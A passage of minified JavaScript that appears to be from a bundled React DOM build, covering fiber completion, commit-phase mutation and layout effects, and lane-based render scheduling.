                        (s = r.nodeValue !== n) && ((e = Xe), e !== null))
                    )
                        switch (e.tag) {
                            case 3:
                                Ws(r.nodeValue, n, (e.mode & 1) !== 0);
                                break;
                            case 5:
                                e.memoizedProps.suppressHydrationWarning !== !0 &&
                                    Ws(r.nodeValue, n, (e.mode & 1) !== 0);
                        }
                    s && (t.flags |= 4);
                } else (r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r)), (r[Ot] = t), (t.stateNode = r);
            }
            return Re(t), null;
        case 13:
            if (
                (ae(ue),
                (r = t.memoizedState),
                e === null || (e.memoizedState !== null && e.memoizedState.dehydrated !== null))
            ) {
                if (ce && qe !== null && t.mode & 1 && !(t.flags & 128)) Em(), ao(), (t.flags |= 98560), (s = !1);
                else if (((s = Ks(t)), r !== null && r.dehydrated !== null)) {
                    if (e === null) {
                        if (!s) throw Error(R(318));
                        if (((s = t.memoizedState), (s = s !== null ? s.dehydrated : null), !s)) throw Error(R(317));
                        s[Ot] = t;
                    } else ao(), !(t.flags & 128) && (t.memoizedState = null), (t.flags |= 4);
                    Re(t), (s = !1);
                } else bt !== null && (uc(bt), (bt = null)), (s = !0);
                if (!s) return t.flags & 65536 ? t : null;
            }
            return t.flags & 128
                ? ((t.lanes = n), t)
                : ((r = r !== null),
                  r !== (e !== null && e.memoizedState !== null) &&
                      r &&
                      ((t.child.flags |= 8192),
                      t.mode & 1 && (e === null || ue.current & 1 ? be === 0 && (be = 3) : wu())),
                  t.updateQueue !== null && (t.flags |= 4),
                  Re(t),
                  null);
        case 4:
            return co(), nc(e, t), e === null && is(t.stateNode.containerInfo), Re(t), null;
        case 10:
            return ru(t.type._context), Re(t), null;
        case 17:
            return Ve(t.type) && Ri(), Re(t), null;
        case 19:
            if ((ae(ue), (s = t.memoizedState), s === null)) return Re(t), null;
            if (((r = (t.flags & 128) !== 0), (i = s.rendering), i === null))
                if (r) Mo(s, !1);
                else {
                    if (be !== 0 || (e !== null && e.flags & 128))
                        for (e = t.child; e !== null; ) {
                            if (((i = Di(e)), i !== null)) {
                                for (
                                    t.flags |= 128,
                                        Mo(s, !1),
                                        r = i.updateQueue,
                                        r !== null && ((t.updateQueue = r), (t.flags |= 4)),
                                        t.subtreeFlags = 0,
                                        r = n,
                                        n = t.child;
                                    n !== null;

                                )
                                    (s = n),
                                        (e = r),
                                        (s.flags &= 14680066),
                                        (i = s.alternate),
                                        i === null
                                            ? ((s.childLanes = 0),
                                              (s.lanes = e),
                                              (s.child = null),
                                              (s.subtreeFlags = 0),
                                              (s.memoizedProps = null),
                                              (s.memoizedState = null),
                                              (s.updateQueue = null),
                                              (s.dependencies = null),
                                              (s.stateNode = null))
                                            : ((s.childLanes = i.childLanes),
                                              (s.lanes = i.lanes),
                                              (s.child = i.child),
                                              (s.subtreeFlags = 0),
                                              (s.deletions = null),
                                              (s.memoizedProps = i.memoizedProps),
                                              (s.memoizedState = i.memoizedState),
                                              (s.updateQueue = i.updateQueue),
                                              (s.type = i.type),
                                              (e = i.dependencies),
                                              (s.dependencies =
                                                  e === null
                                                      ? null
                                                      : { lanes: e.lanes, firstContext: e.firstContext })),
                                        (n = n.sibling);
                                return oe(ue, (ue.current & 1) | 2), t.child;
                            }
                            e = e.sibling;
                        }
                    s.tail !== null && ye() > po && ((t.flags |= 128), (r = !0), Mo(s, !1), (t.lanes = 4194304));
                }
            else {
                if (!r)
                    if (((e = Di(i)), e !== null)) {
                        if (
                            ((t.flags |= 128),
                            (r = !0),
                            (n = e.updateQueue),
                            n !== null && ((t.updateQueue = n), (t.flags |= 4)),
                            Mo(s, !0),
                            s.tail === null && s.tailMode === "hidden" && !i.alternate && !ce)
                        )
                            return Re(t), null;
                    } else
                        2 * ye() - s.renderingStartTime > po &&
                            n !== 1073741824 &&
                            ((t.flags |= 128), (r = !0), Mo(s, !1), (t.lanes = 4194304));
                s.isBackwards
                    ? ((i.sibling = t.child), (t.child = i))
                    : ((n = s.last), n !== null ? (n.sibling = i) : (t.child = i), (s.last = i));
            }
            return s.tail !== null
                ? ((t = s.tail),
                  (s.rendering = t),
                  (s.tail = t.sibling),
                  (s.renderingStartTime = ye()),
                  (t.sibling = null),
                  (n = ue.current),
                  oe(ue, r ? (n & 1) | 2 : n & 1),
                  t)
                : (Re(t), null);
        case 22:
        case 23:
            return (
                xu(),
                (r = t.memoizedState !== null),
                e !== null && (e.memoizedState !== null) !== r && (t.flags |= 8192),
                r && t.mode & 1 ? Qe & 1073741824 && (Re(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : Re(t),
                null
            );
        case 24:
            return null;
        case 25:
            return null;
    }
    throw Error(R(156, t.tag));
}
function T1(e, t) {
    switch ((Jc(t), t.tag)) {
        case 1:
            return Ve(t.type) && Ri(), (e = t.flags), e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null;
        case 3:
            return (
                co(),
                ae(Be),
                ae(_e),
                lu(),
                (e = t.flags),
                e & 65536 && !(e & 128) ? ((t.flags = (e & -65537) | 128), t) : null
            );
        case 5:
            return au(t), null;
        case 13:
            if ((ae(ue), (e = t.memoizedState), e !== null && e.dehydrated !== null)) {
                if (t.alternate === null) throw Error(R(340));
                ao();
            }
            return (e = t.flags), e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null;
        case 19:
            return ae(ue), null;
        case 4:
            return co(), null;
        case 10:
            return ru(t.type._context), null;
        case 22:
        case 23:
            return xu(), null;
        case 24:
            return null;
        default:
            return null;
    }
}
var qs = !1,
    Me = !1,
    j1 = typeof WeakSet == "function" ? WeakSet : Set,
    z = null;
function Fr(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function")
            try {
                n(null);
            } catch (r) {
                he(e, t, r);
            }
        else n.current = null;
}
function rc(e, t, n) {
    try {
        n();
    } catch (r) {
        he(e, t, r);
    }
}
var Jd = !1;
function R1(e, t) {
    if (((Ul = Ni), (e = pm()), Yc(e))) {
        if ("selectionStart" in e) var n = { start: e.selectionStart, end: e.selectionEnd };
        else
            e: {
                n = ((n = e.ownerDocument) && n.defaultView) || window;
                var r = n.getSelection && n.getSelection();
                if (r && r.rangeCount !== 0) {
                    n = r.anchorNode;
                    var o = r.anchorOffset,
                        s = r.focusNode;
                    r = r.focusOffset;
                    try {
                        n.nodeType, s.nodeType;
                    } catch {
                        n = null;
                        break e;
                    }
                    var i = 0,
                        a = -1,
                        l = -1,
                        u = 0,
                        d = 0,
                        p = e,
                        m = null;
                    t: for (;;) {
                        for (
                            var f;
                            p !== n || (o !== 0 && p.nodeType !== 3) || (a = i + o),
                                p !== s || (r !== 0 && p.nodeType !== 3) || (l = i + r),
                                p.nodeType === 3 && (i += p.nodeValue.length),
                                (f = p.firstChild) !== null;

                        )
                            (m = p), (p = f);
                        for (;;) {
                            if (p === e) break t;
                            if (
                                (m === n && ++u === o && (a = i),
                                m === s && ++d === r && (l = i),
                                (f = p.nextSibling) !== null)
                            )
                                break;
                            (p = m), (m = p.parentNode);
                        }
                        p = f;
                    }
                    n = a === -1 || l === -1 ? null : { start: a, end: l };
                } else n = null;
            }
        n = n || { start: 0, end: 0 };
    } else n = null;
    for ($l = { focusedElem: e, selectionRange: n }, Ni = !1, z = t; z !== null; )
        if (((t = z), (e = t.child), (t.subtreeFlags & 1028) !== 0 && e !== null)) (e.return = t), (z = e);
        else
            for (; z !== null; ) {
                t = z;
                try {
                    var S = t.alternate;
                    if (t.flags & 1024)
                        switch (t.tag) {
                            case 0:
                            case 11:
                            case 15:
                                break;
                            case 1:
                                if (S !== null) {
                                    var v = S.memoizedProps,
                                        w = S.memoizedState,
                                        g = t.stateNode,
                                        h = g.getSnapshotBeforeUpdate(t.elementType === t.type ? v : yt(t.type, v), w);
                                    g.__reactInternalSnapshotBeforeUpdate = h;
                                }
                                break;
                            case 3:
                                var y = t.stateNode.containerInfo;
                                y.nodeType === 1
                                    ? (y.textContent = "")
                                    : y.nodeType === 9 && y.documentElement && y.removeChild(y.documentElement);
                                break;
                            case 5:
                            case 6:
                            case 4:
                            case 17:
                                break;
                            default:
                                throw Error(R(163));
                        }
                } catch (b) {
                    he(t, t.return, b);
                }
                if (((e = t.sibling), e !== null)) {
                    (e.return = t.return), (z = e);
                    break;
                }
                z = t.return;
            }
    return (S = Jd), (Jd = !1), S;
}
function Qo(e, t, n) {
    var r = t.updateQueue;
    if (((r = r !== null ? r.lastEffect : null), r !== null)) {
        var o = (r = r.next);
        do {
            if ((o.tag & e) === e) {
                var s = o.destroy;
                (o.destroy = void 0), s !== void 0 && rc(t, n, s);
            }
            o = o.next;
        } while (o !== r);
    }
}
function da(e, t) {
    if (((t = t.updateQueue), (t = t !== null ? t.lastEffect : null), t !== null)) {
        var n = (t = t.next);
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r();
            }
            n = n.next;
        } while (n !== t);
    }
}
function oc(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n;
        }
        typeof t == "function" ? t(e) : (t.current = e);
    }
}
function lh(e) {
    var t = e.alternate;
    t !== null && ((e.alternate = null), lh(t)),
        (e.child = null),
        (e.deletions = null),
        (e.sibling = null),
        e.tag === 5 &&
            ((t = e.stateNode), t !== null && (delete t[Ot], delete t[ls], delete t[Vl], delete t[p1], delete t[f1])),
        (e.stateNode = null),
        (e.return = null),
        (e.dependencies = null),
        (e.memoizedProps = null),
        (e.memoizedState = null),
        (e.pendingProps = null),
        (e.stateNode = null),
        (e.updateQueue = null);
}
function ch(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4;
}
function ep(e) {
    e: for (;;) {
        for (; e.sibling === null; ) {
            if (e.return === null || ch(e.return)) return null;
            e = e.return;
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18; ) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            (e.child.return = e), (e = e.child);
        }
        if (!(e.flags & 2)) return e.stateNode;
    }
}
function sc(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        (e = e.stateNode),
            t
                ? n.nodeType === 8
                    ? n.parentNode.insertBefore(e, t)
                    : n.insertBefore(e, t)
                : (n.nodeType === 8 ? ((t = n.parentNode), t.insertBefore(e, n)) : ((t = n), t.appendChild(e)),
                  (n = n._reactRootContainer),
                  n != null || t.onclick !== null || (t.onclick = ji));
    else if (r !== 4 && ((e = e.child), e !== null))
        for (sc(e, t, n), e = e.sibling; e !== null; ) sc(e, t, n), (e = e.sibling);
}
function ic(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) (e = e.stateNode), t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && ((e = e.child), e !== null))
        for (ic(e, t, n), e = e.sibling; e !== null; ) ic(e, t, n), (e = e.sibling);
}
var Ee = null,
    St = !1;
function pn(e, t, n) {
    for (n = n.child; n !== null; ) uh(e, t, n), (n = n.sibling);
}
function uh(e, t, n) {
    if (Dt && typeof Dt.onCommitFiberUnmount == "function")
        try {
            Dt.onCommitFiberUnmount(ra, n);
        } catch {}
    switch (n.tag) {
        case 5:
            Me || Fr(n, t);
        case 6:
            var r = Ee,
                o = St;
            (Ee = null),
                pn(e, t, n),
                (Ee = r),
                (St = o),
                Ee !== null &&
                    (St
                        ? ((e = Ee),
                          (n = n.stateNode),
                          e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n))
                        : Ee.removeChild(n.stateNode));
            break;
        case 18:
            Ee !== null &&
                (St
                    ? ((e = Ee),
                      (n = n.stateNode),
                      e.nodeType === 8 ? qa(e.parentNode, n) : e.nodeType === 1 && qa(e, n),
                      rs(e))
                    : qa(Ee, n.stateNode));
            break;
        case 4:
            (r = Ee), (o = St), (Ee = n.stateNode.containerInfo), (St = !0), pn(e, t, n), (Ee = r), (St = o);
            break;
        case 0:
        case 11:
        case 14:
        case 15:
            if (!Me && ((r = n.updateQueue), r !== null && ((r = r.lastEffect), r !== null))) {
                o = r = r.next;
                do {
                    var s = o,
                        i = s.destroy;
                    (s = s.tag), i !== void 0 && (s & 2 || s & 4) && rc(n, t, i), (o = o.next);
                } while (o !== r);
            }
            pn(e, t, n);
            break;
        case 1:
            if (!Me && (Fr(n, t), (r = n.stateNode), typeof r.componentWillUnmount == "function"))
                try {
                    (r.props = n.memoizedProps), (r.state = n.memoizedState), r.componentWillUnmount();
                } catch (a) {
                    he(n, t, a);
                }
            pn(e, t, n);
            break;
        case 21:
            pn(e, t, n);
            break;
        case 22:
            n.mode & 1 ? ((Me = (r = Me) || n.memoizedState !== null), pn(e, t, n), (Me = r)) : pn(e, t, n);
            break;
        default:
            pn(e, t, n);
    }
}
function tp(e) {
    var t = e.updateQueue;
    if (t !== null) {
        e.updateQueue = null;
        var n = e.stateNode;
        n === null && (n = e.stateNode = new j1()),
            t.forEach(function (r) {
                var o = F1.bind(null, e, r);
                n.has(r) || (n.add(r), r.then(o, o));
            });
    }
}
function ht(e, t) {
    var n = t.deletions;
    if (n !== null)
        for (var r = 0; r < n.length; r++) {
            var o = n[r];
            try {
                var s = e,
                    i = t,
                    a = i;
                e: for (; a !== null; ) {
                    switch (a.tag) {
                        case 5:
                            (Ee = a.stateNode), (St = !1);
                            break e;
                        case 3:
                            (Ee = a.stateNode.containerInfo), (St = !0);
                            break e;
                        case 4:
                            (Ee = a.stateNode.containerInfo), (St = !0);
                            break e;
                    }
                    a = a.return;
                }
                if (Ee === null) throw Error(R(160));
                uh(s, i, o), (Ee = null), (St = !1);
                var l = o.alternate;
                l !== null && (l.return = null), (o.return = null);
            } catch (u) {
                he(o, t, u);
            }
        }
    if (t.subtreeFlags & 12854) for (t = t.child; t !== null; ) dh(t, e), (t = t.sibling);
}
function dh(e, t) {
    var n = e.alternate,
        r = e.flags;
    switch (e.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
            if ((ht(t, e), Rt(e), r & 4)) {
                try {
                    Qo(3, e, e.return), da(3, e);
                } catch (v) {
                    he(e, e.return, v);
                }
                try {
                    Qo(5, e, e.return);
                } catch (v) {
                    he(e, e.return, v);
                }
            }
            break;
        case 1:
            ht(t, e), Rt(e), r & 512 && n !== null && Fr(n, n.return);
            break;
        case 5:
            if ((ht(t, e), Rt(e), r & 512 && n !== null && Fr(n, n.return), e.flags & 32)) {
                var o = e.stateNode;
                try {
                    Jo(o, "");
                } catch (v) {
                    he(e, e.return, v);
                }
            }
            if (r & 4 && ((o = e.stateNode), o != null)) {
                var s = e.memoizedProps,
                    i = n !== null ? n.memoizedProps : s,
                    a = e.type,
                    l = e.updateQueue;
                if (((e.updateQueue = null), l !== null))
                    try {
                        a === "input" && s.type === "radio" && s.name != null && _f(o, s), Rl(a, i);
                        var u = Rl(a, s);
                        for (i = 0; i < l.length; i += 2) {
                            var d = l[i],
                                p = l[i + 1];
                            d === "style"
                                ? zf(o, p)
                                : d === "dangerouslySetInnerHTML"
                                  ? If(o, p)
                                  : d === "children"
                                    ? Jo(o, p)
                                    : zc(o, d, p, u);
                        }
                        switch (a) {
                            case "input":
                                El(o, s);
                                break;
                            case "textarea":
                                Lf(o, s);
                                break;
                            case "select":
                                var m = o._wrapperState.wasMultiple;
                                o._wrapperState.wasMultiple = !!s.multiple;
                                var f = s.value;
                                f != null
                                    ? Hr(o, !!s.multiple, f, !1)
                                    : m !== !!s.multiple &&
                                      (s.defaultValue != null
                                          ? Hr(o, !!s.multiple, s.defaultValue, !0)
                                          : Hr(o, !!s.multiple, s.multiple ? [] : "", !1));
                        }
                        o[ls] = s;
                    } catch (v) {
                        he(e, e.return, v);
                    }
            }
            break;
        case 6:
            if ((ht(t, e), Rt(e), r & 4)) {
                if (e.stateNode === null) throw Error(R(162));
                (o = e.stateNode), (s = e.memoizedProps);
                try {
                    o.nodeValue = s;
                } catch (v) {
                    he(e, e.return, v);
                }
            }
            break;
        case 3:
            if ((ht(t, e), Rt(e), r & 4 && n !== null && n.memoizedState.isDehydrated))
                try {
                    rs(t.containerInfo);
                } catch (v) {
                    he(e, e.return, v);
                }
            break;
        case 4:
            ht(t, e), Rt(e);
            break;
        case 13:
            ht(t, e),
                Rt(e),
                (o = e.child),
                o.flags & 8192 &&
                    ((s = o.memoizedState !== null),
                    (o.stateNode.isHidden = s),
                    !s || (o.alternate !== null && o.alternate.memoizedState !== null) || (yu = ye())),
                r & 4 && tp(e);
            break;
        case 22:
            if (
                ((d = n !== null && n.memoizedState !== null),
                e.mode & 1 ? ((Me = (u = Me) || d), ht(t, e), (Me = u)) : ht(t, e),
                Rt(e),
                r & 8192)
            ) {
                if (((u = e.memoizedState !== null), (e.stateNode.isHidden = u) && !d && e.mode & 1))
                    for (z = e, d = e.child; d !== null; ) {
                        for (p = z = d; z !== null; ) {
                            switch (((m = z), (f = m.child), m.tag)) {
                                case 0:
                                case 11:
                                case 14:
                                case 15:
                                    Qo(4, m, m.return);
                                    break;
                                case 1:
                                    Fr(m, m.return);
                                    var S = m.stateNode;
                                    if (typeof S.componentWillUnmount == "function") {
                                        (r = m), (n = m.return);
                                        try {
                                            (t = r),
                                                (S.props = t.memoizedProps),
                                                (S.state = t.memoizedState),
                                                S.componentWillUnmount();
                                        } catch (v) {
                                            he(r, n, v);
                                        }
                                    }
                                    break;
                                case 5:
                                    Fr(m, m.return);
                                    break;
                                case 22:
                                    if (m.memoizedState !== null) {
                                        rp(p);
                                        continue;
                                    }
                            }
                            f !== null ? ((f.return = m), (z = f)) : rp(p);
                        }
                        d = d.sibling;
                    }
                e: for (d = null, p = e; ; ) {
                    if (p.tag === 5) {
                        if (d === null) {
                            d = p;
                            try {
                                (o = p.stateNode),
                                    u
                                        ? ((s = o.style),
                                          typeof s.setProperty == "function"
                                              ? s.setProperty("display", "none", "important")
                                              : (s.display = "none"))
                                        : ((a = p.stateNode),
                                          (l = p.memoizedProps.style),
                                          (i = l != null && l.hasOwnProperty("display") ? l.display : null),
                                          (a.style.display = Df("display", i)));
                            } catch (v) {
                                he(e, e.return, v);
                            }
                        }
                    } else if (p.tag === 6) {
                        if (d === null)
                            try {
                                p.stateNode.nodeValue = u ? "" : p.memoizedProps;
                            } catch (v) {
                                he(e, e.return, v);
                            }
                    } else if (
                        ((p.tag !== 22 && p.tag !== 23) || p.memoizedState === null || p === e) &&
                        p.child !== null
                    ) {
                        (p.child.return = p), (p = p.child);
                        continue;
                    }
                    if (p === e) break e;
                    for (; p.sibling === null; ) {
                        if (p.return === null || p.return === e) break e;
                        d === p && (d = null), (p = p.return);
                    }
                    d === p && (d = null), (p.sibling.return = p.return), (p = p.sibling);
                }
            }
            break;
        case 19:
            ht(t, e), Rt(e), r & 4 && tp(e);
            break;
        case 21:
            break;
        default:
            ht(t, e), Rt(e);
    }
}
function Rt(e) {
    var t = e.flags;
    if (t & 2) {
        try {
            e: {
                for (var n = e.return; n !== null; ) {
                    if (ch(n)) {
                        var r = n;
                        break e;
                    }
                    n = n.return;
                }
                throw Error(R(160));
            }
            switch (r.tag) {
                case 5:
                    var o = r.stateNode;
                    r.flags & 32 && (Jo(o, ""), (r.flags &= -33));
                    var s = ep(e);
                    ic(e, s, o);
                    break;
                case 3:
                case 4:
                    var i = r.stateNode.containerInfo,
                        a = ep(e);
                    sc(e, a, i);
                    break;
                default:
                    throw Error(R(161));
            }
        } catch (l) {
            he(e, e.return, l);
        }
        e.flags &= -3;
    }
    t & 4096 && (e.flags &= -4097);
}
function A1(e, t, n) {
    (z = e), ph(e);
}
function ph(e, t, n) {
    for (var r = (e.mode & 1) !== 0; z !== null; ) {
        var o = z,
            s = o.child;
        if (o.tag === 22 && r) {
            var i = o.memoizedState !== null || qs;
            if (!i) {
                var a = o.alternate,
                    l = (a !== null && a.memoizedState !== null) || Me;
                a = qs;
                var u = Me;
                if (((qs = i), (Me = l) && !u))
                    for (z = o; z !== null; )
                        (i = z),
                            (l = i.child),
                            i.tag === 22 && i.memoizedState !== null
                                ? op(o)
                                : l !== null
                                  ? ((l.return = i), (z = l))
                                  : op(o);
                for (; s !== null; ) (z = s), ph(s), (s = s.sibling);
                (z = o), (qs = a), (Me = u);
            }
            np(e);
        } else o.subtreeFlags & 8772 && s !== null ? ((s.return = o), (z = s)) : np(e);
    }
}
function np(e) {
    for (; z !== null; ) {
        var t = z;
        if (t.flags & 8772) {
            var n = t.alternate;
            try {
                if (t.flags & 8772)
                    switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            Me || da(5, t);
                            break;
                        case 1:
                            var r = t.stateNode;
                            if (t.flags & 4 && !Me)
                                if (n === null) r.componentDidMount();
                                else {
                                    var o = t.elementType === t.type ? n.memoizedProps : yt(t.type, n.memoizedProps);
                                    r.componentDidUpdate(o, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate);
                                }
                            var s = t.updateQueue;
                            s !== null && Ud(t, s, r);
                            break;
                        case 3:
                            var i = t.updateQueue;
                            if (i !== null) {
                                if (((n = null), t.child !== null))
                                    switch (t.child.tag) {
                                        case 5:
                                            n = t.child.stateNode;
                                            break;
                                        case 1:
                                            n = t.child.stateNode;
                                    }
                                Ud(t, i, n);
                            }
                            break;
                        case 5:
                            var a = t.stateNode;
                            if (n === null && t.flags & 4) {
                                n = a;
                                var l = t.memoizedProps;
                                switch (t.type) {
                                    case "button":
                                    case "input":
                                    case "select":
                                    case "textarea":
                                        l.autoFocus && n.focus();
                                        break;
                                    case "img":
                                        l.src && (n.src = l.src);
                                }
                            }
                            break;
                        case 6:
                            break;
                        case 4:
                            break;
                        case 12:
                            break;
                        case 13:
                            if (t.memoizedState === null) {
                                var u = t.alternate;
                                if (u !== null) {
                                    var d = u.memoizedState;
                                    if (d !== null) {
                                        var p = d.dehydrated;
                                        p !== null && rs(p);
                                    }
                                }
                            }
                            break;
                        case 19:
                        case 17:
                        case 21:
                        case 22:
                        case 23:
                        case 25:
                            break;
                        default:
                            throw Error(R(163));
                    }
                Me || (t.flags & 512 && oc(t));
            } catch (m) {
                he(t, t.return, m);
            }
        }
        if (t === e) {
            z = null;
            break;
        }
        if (((n = t.sibling), n !== null)) {
            (n.return = t.return), (z = n);
            break;
        }
        z = t.return;
    }
}
function rp(e) {
    for (; z !== null; ) {
        var t = z;
        if (t === e) {
            z = null;
            break;
        }
        var n = t.sibling;
        if (n !== null) {
            (n.return = t.return), (z = n);
            break;
        }
        z = t.return;
    }
}
function op(e) {
    for (; z !== null; ) {
        var t = z;
        try {
            switch (t.tag) {
                case 0:
                case 11:
                case 15:
                    var n = t.return;
                    try {
                        da(4, t);
                    } catch (l) {
                        he(t, n, l);
                    }
                    break;
                case 1:
                    var r = t.stateNode;
                    if (typeof r.componentDidMount == "function") {
                        var o = t.return;
                        try {
                            r.componentDidMount();
                        } catch (l) {
                            he(t, o, l);
                        }
                    }
                    var s = t.return;
                    try {
                        oc(t);
                    } catch (l) {
                        he(t, s, l);
                    }
                    break;
                case 5:
                    var i = t.return;
                    try {
                        oc(t);
                    } catch (l) {
                        he(t, i, l);
                    }
            }
        } catch (l) {
            he(t, t.return, l);
        }
        if (t === e) {
            z = null;
            break;
        }
        var a = t.sibling;
        if (a !== null) {
            (a.return = t.return), (z = a);
            break;
        }
        z = t.return;
    }
}
var M1 = Math.ceil,
    Ui = sn.ReactCurrentDispatcher,
    hu = sn.ReactCurrentOwner,
    it = sn.ReactCurrentBatchConfig,
    J = 0,
    Ce = null,
    ve = null,
    Ne = 0,
    Qe = 0,
    Ur = Vn(0),
    be = 0,
    ms = null,
    dr = 0,
    pa = 0,
    gu = 0,
    Go = null,
    $e = null,
    yu = 0,
    po = 1 / 0,
    Kt = null,
    $i = !1,
    ac = null,
    _n = null,
    Xs = !1,
    Nn = null,
    Hi = 0,
    qo = 0,
    lc = null,
    hi = -1,
    gi = 0;
function De() {
    return J & 6 ? ye() : hi !== -1 ? hi : (hi = ye());
}
function Ln(e) {
    return e.mode & 1
        ? J & 2 && Ne !== 0
            ? Ne & -Ne
            : h1.transition !== null
              ? (gi === 0 && (gi = Xf()), gi)
              : ((e = te), e !== 0 || ((e = window.event), (e = e === void 0 ? 16 : rm(e.type))), e)
        : 1;
}
function Ct(e, t, n, r) {
    if (50 < qo) throw ((qo = 0), (lc = null), Error(R(185)));
    Cs(e, n, r),
        (!(J & 2) || e !== Ce) &&
            (e === Ce && (!(J & 2) && (pa |= n), be === 4 && xn(e, Ne)),
            We(e, r),
            n === 1 && J === 0 && !(t.mode & 1) && ((po = ye() + 500), la && Wn()));
}
function We(e, t) {
    var n = e.callbackNode;
    h0(e, t);
    var r = Ei(e, e === Ce ? Ne : 0);
    if (r === 0) n !== null && fd(n), (e.callbackNode = null), (e.callbackPriority = 0);
    else if (((t = r & -r), e.callbackPriority !== t)) {
        if ((n != null && fd(n), t === 1))
            e.tag === 0 ? m1(sp.bind(null, e)) : bm(sp.bind(null, e)),
                u1(function () {
                    !(J & 6) && Wn();
                }),
                (n = null);
        else {
            switch (Yf(r)) {
                case 1:
                    n = Bc;
                    break;
                case 4:
                    n = Gf;
                    break;
                case 16:
                    n = Ci;
                    break;
                case 536870912:
                    n = qf;
                    break;
                default:
                    n = Ci;
            }
            n = wh(n, fh.bind(null, e));
        }
        (e.callbackPriority = t), (e.callbackNode = n);
    }
}
function fh(e, t) {
    if (((hi = -1), (gi = 0), J & 6)) throw Error(R(327));
    var n = e.callbackNode;
    if (Qr() && e.callbackNode !== n) return null;
    var r = Ei(e, e === Ce ? Ne : 0);
    if (r === 0) return null;
    if (r & 30 || r & e.expiredLanes || t) t = Bi(e, r);
    else {
        t = r;
        var o = J;
        J |= 2;
        var s = hh();
        (Ce !== e || Ne !== t) && ((Kt = null), (po = ye() + 500), ir(e, t));
        do
            try {
                O1();
                break;
            } catch (a) {
                mh(e, a);
            }
        while (!0);
        nu(), (Ui.current = s), (J = o), ve !== null ? (t = 0) : ((Ce = null), (Ne = 0), (t = be));
    }
    if (t !== 0) {
        if ((t === 2 && ((o = Ol(e)), o !== 0 && ((r = o), (t = cc(e, o)))), t === 1))
            throw ((n = ms), ir(e, 0), xn(e, r), We(e, ye()), n);
        if (t === 6) xn(e, r);
        else {
            if (
                ((o = e.current.alternate),
                !(r & 30) &&
                    !_1(o) &&
                    ((t = Bi(e, r)), t === 2 && ((s = Ol(e)), s !== 0 && ((r = s), (t = cc(e, s)))), t === 1))
            )
                throw ((n = ms), ir(e, 0), xn(e, r), We(e, ye()), n);
            switch (((e.finishedWork = o), (e.finishedLanes = r), t)) {
                case 0:
                case 1:
                    throw Error(R(345));
                case 2:
                    Xn(e, $e, Kt);
                    break;
                case 3:
                    if ((xn(e, r), (r & 130023424) === r && ((t = yu + 500 - ye()), 10 < t))) {
                        if (Ei(e, 0) !== 0) break;
                        if (((o = e.suspendedLanes), (o & r) !== r)) {
                            De(), (e.pingedLanes |= e.suspendedLanes & o);
                            break;
                        }
                        e.timeoutHandle = Bl(Xn.bind(null, e, $e, Kt), t);
                        break;
                    }
                    Xn(e, $e, Kt);
                    break;
                case 4:
                    if ((xn(e, r), (r & 4194240) === r)) break;
                    for (t = e.eventTimes, o = -1; 0 < r; ) {
                        var i = 31 - kt(r);
                        (s = 1 << i), (i = t[i]), i > o && (o = i), (r &= ~s);
                    }
                    if (
                        ((r = o),
                        (r = ye() - r),
                        (r =
                            (120 > r
                                ? 120
                                : 480 > r
                                  ? 480
                                  : 1080 > r
                                    ? 1080
                                    : 1920 > r
                                      ? 1920
                                      : 3e3 > r
                                        ? 3e3
                                        : 4320 > r
                                          ? 4320
                                          : 1960 * M1(r / 1960)) - r),
                        10 < r)
                    ) {
                        e.timeoutHandle = Bl(Xn.bind(null, e, $e, Kt), r);
                        break;
                    }
                    Xn(e, $e, Kt);
                    break;
                case 5:
                    Xn(e, $e, Kt);
                    break;
                default:
                    throw Error(R(329));
            }
        }
    }
    return We(e, ye()), e.callbackNode === n ? fh.bind(null, e) : null;
}
function cc(e, t) {
    var n = Go;
    return (
        e.current.memoizedState.isDehydrated && (ir(e, t).flags |= 256),
        (e = Bi(e, t)),
        e !== 2 && ((t = $e), ($e = n), t !== null && uc(t)),
        e
    );
}
function uc(e) {
    $e === null ? ($e = e) : $e.push.apply($e, e);
}
function _1(e) {
    for (var t = e; ; ) {
        if (t.flags & 16384) {
            var n = t.updateQueue;
            if (n !== null && ((n = n.stores), n !== null))
                for (var r = 0; r < n.length; r++) {
                    var o = n[r],
                        s = o.getSnapshot;
                    o = o.value;
                    try {
                        if (!Et(s(), o)) return !1;
                    } catch {
                        return !1;
                    }
                }
        }
        if (((n = t.child), t.subtreeFlags & 16384 && n !== null)) (n.return = t), (t = n);
        else {
            if (t === e) break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === e) return !0;
                t = t.return;
            }
            (t.sibling.return = t.return), (t = t.sibling);
        }
    }
    return !0;
}
function xn(e, t) {
    for (t &= ~gu, t &= ~pa, e.suspendedLanes |= t, e.pingedLanes &= ~t, e = e.expirationTimes; 0 < t; ) {
        var n = 31 - kt(t),
            r = 1 << n;
        (e[n] = -1), (t &= ~r);
    }
}
function sp(e) {
    if (J & 6) throw Error(R(327));
    Qr();
    var t = Ei(e, 0);
    if (!(t & 1)) return We(e, ye()), null;
    var n = Bi(e, t);
    if (e.tag !== 0 && n === 2) {
        var r = Ol(e);
        r !== 0 && ((t = r), (n = cc(e, r)));
    }
    if (n === 1) throw ((n = ms), ir(e, 0), xn(e, t), We(e, ye()), n);
    if (n === 6) throw Error(R(345));
    return (e.finishedWork = e.current.alternate), (e.finishedLanes = t), Xn(e, $e, Kt), We(e, ye()), null;
}
function vu(e, t) {
    var n = J;
    J |= 1;
    try {
        return e(t);
    } finally {
        (J = n), J === 0 && ((po = ye() + 500), la && Wn());
    }
}
